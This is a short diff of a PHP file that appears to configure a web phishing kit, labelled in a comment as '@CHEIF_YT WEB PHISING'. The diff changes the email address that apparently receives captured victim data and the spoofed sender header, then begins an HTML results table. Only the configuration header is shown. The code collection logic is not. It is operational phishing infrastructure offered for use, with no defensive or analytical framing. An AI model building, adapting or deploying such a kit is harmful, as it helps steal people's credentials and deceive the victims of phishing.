@@ -1,6 +1,6 @@
 <?php
-$imel = "cheifyt63@gmail.com";
-$sender = "From: 🇮🇳 𝐂𝐇𝐄𝐈𝐅 𝐘𝐓 🔥🔥 <cheifytstore@gmail.com>";
+$imel = "godf3115@gmail.com";
+$sender = "From: 🇮🇳 𝐂𝐇𝐄𝐈𝐅 𝐘𝐓 🔥🔥 <godf3115@gmail.com>";
 $banner = "https://user-images.githubusercontent.com/82880865/185098657-b5076936-b1c7-44c0-a18a-d688ec2c661b.jpg";
 $more = '<table style="border-collapse: collapse; border-color: black; background: #98FF98" width="100%" border="1">
             <!-- @CHEIF_YT WEB PHISING -->
